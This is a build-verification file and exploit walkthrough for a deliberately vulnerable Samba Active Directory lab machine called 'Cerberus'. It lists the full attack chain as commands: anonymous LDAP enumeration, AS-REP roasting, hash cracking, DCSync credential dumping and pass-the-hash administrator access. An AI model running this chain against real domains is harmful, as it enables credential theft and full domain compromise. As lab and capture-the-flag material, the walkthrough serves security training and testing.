# Cerberus Machine Verification

## 1. Build Verification
Run the following command in `machines/Cerberus`:
```bash
docker-compose build
```

## 2. Service Verification
Start the machine:
```bash
docker-compose up -d
```
Check running services:
- **DNS (53)**
- **Kerberos (88)**
- **SMB (445)**
- **LDAP (389)**

## 3. Exploit Walkthrough

### Step 1: Reconnaissance
1.  **Port Scan**: Confirm Samba AD ports.
2.  **User Enumeration** (Anonymous LDAP):
    -   Host: `cerberus.local` (Add specific IP to hosts file if needed, or use IP).
    -   Command:
        ```bash
        ldapsearch -x -H ldap://<TARGET_IP> -b "DC=cerberus,DC=local"
        ```
    -   Look for users. Identify `svc_backup`.

### Step 2: AS-REP Roasting
1.  Target: `svc_backup`.
2.  Command:
    ```bash
    impacket-GetNPUsers cerberus.local/ -usersfile users.txt -no-pass -dc-ip <TARGET_IP>
    ```
3.  Result: TGT Hash for `svc_backup`.
4.  **Crack Hash**:
    -   `john --wordlist=rockyou.txt hash.txt`
    -   Password: `BackupM@ster2023!`

### Step 3: DCSync (Privilege Escalation)
1.  Command:
    ```bash
    impacket-secretsdump 'cerberus.local/svc_backup:BackupM@ster2023!@<TARGET_IP>'
    ```
2.  Result:
    ```text
    Administrator:500:aad3b...:ntlm_hash:::
    ```

### Step 4: Administrator Access
1.  Use the hash to access the machine or prove compromise.
    ```bash
    impacket-wmiexec 'cerberus.local/Administrator@<TARGET_IP>' -hashes :<NTLM_HASH>
    ```
    (Note: WMI might be flaky on Samba container, use `smbclient` or `smbexec` if WMI fails).
2.  **Verify Access**:
    ```bash
    smbclient //<TARGET_IP>/Flags -U Administrator --pw-nt-hash <NTLM_HASH>
    ```
